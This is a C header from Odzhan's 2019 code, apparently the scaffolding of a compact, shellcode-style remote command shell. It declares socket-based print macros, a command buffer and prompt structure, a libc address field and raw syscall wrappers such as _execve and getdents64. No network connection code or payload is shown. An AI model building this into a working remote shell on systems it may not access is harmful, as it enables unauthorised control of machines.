/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <signal.h>
#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <dirent.h>
#include <glob.h>

#include <fcntl.h>
#include <dlfcn.h>
#include <sys/mman.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/utsname.h>
#include <poll.h>

#define BUFFER_SIZE_BIG 4096
#define BUFFER_SIZE     1024

// write helpers

// prints existing char array where sizeof() could be calculated by compiler - use it for special symbols
#define PRINT_CHARS(s, text) write(s, text, sizeof(text));
// prints char constant with conversion to char array - use it for constant strings
#define PRINT_TEXT(s, text) { const char _tmp[] = text; write(s, _tmp, sizeof(_tmp)); }
// prints char * line with unknown length. Not valid for constant strings! compiler will move them to .strings section
#define PRINT_STR(s, text) write(s, text, strlen(text));
// prints a char * line line with known length
#define PRINT_LEN(s, text, len) write(s, text, len);
// prints decimal int
#define PRINT_INT(s, value) write_int(s, value, 10);
// prints hex int
#define PRINT_HEX(s, value) write_int(s, value, 16);

#ifndef _COMPACT
  #define PRINT_ERROR(s, text) { PRINT_LEN(s, data->symbols.error, 2); PRINT_TEXT(s, text); PRINT_LEN(s, data->symbols.newline, 1);}
#else
  #define PRINT_ERROR(s, text) PRINT_CHARS(s, data->symbols.error);
#endif    

#define IPV4_ADDR(d, c, b, a) (((a & 0xff) << 24) | ((b & 0xff) << 16) | ((c & 0xff) << 8) | (d & 0xff))

#ifdef LIBC
long get_libc(char * buffer, int len);
#endif

// uses ltoa to write a string and a newline
void write_int(int s, long value, int radix);

// helper for data storage
typedef struct _data_t
{
  int s;                // socket file descriptor
  char command[BUFFER_SIZE]; // current command
  int command_len;      // length of current command
  //int shell_mode;       // flag indicating that we need to pass everything to child process
  char temp[BUFFER_SIZE_BIG];    // temporary buffer

#ifdef LIBC
  long libc_addr;
#endif

  union 
  {
    long long_symbols;
    struct
    {
        char newline[1];
        char prompt[2];
        char curr_dir[2];
        char error[3];
    } symbols;
  };
  
} data_t;

// not in headers
struct linux_dirent {
	long   d_ino;
	off_t  d_off;
	unsigned short d_reclen;
	char   d_name[];
};

// misc functions

ssize_t getdents64(int fd, void *dirp, size_t count);
int _open(const char *pathname, int flags, mode_t mode);
int _execve(const char *pathname, char *const argv[], char *const envp[]);
int _fstat(int fd, struct stat *buf);
int _ltoa(long value, char *sp, int radix);

// command processor

void process_command(data_t *data);